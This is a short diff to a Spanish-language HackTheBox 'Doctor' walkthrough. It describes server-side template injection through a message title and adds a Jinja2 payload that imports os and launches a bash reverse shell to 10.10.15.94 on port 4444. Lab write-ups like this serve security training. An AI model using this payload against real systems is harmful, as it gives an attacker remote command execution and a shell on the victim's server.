@@ -60,3 +60,10 @@ Creo un mensaje que contenga la inyección en el título
 Y accedo a la página archive, y en el código fuente aparece lo siguiente:
 
 ![](/assets/images/Doctor-Hackthebox/doctor-comandos.png)
+
+Tengo ejecución de comandos!
+Cambio el título y pongo lo siguiente para la reverse shell:
+
+```python
+{{request.application.__globals__.__builtins__.__import__('os').popen("bash -c 'bash -i >& /dev/tcp/10.10.15.94/4444 0>&1'").read()}}
+```
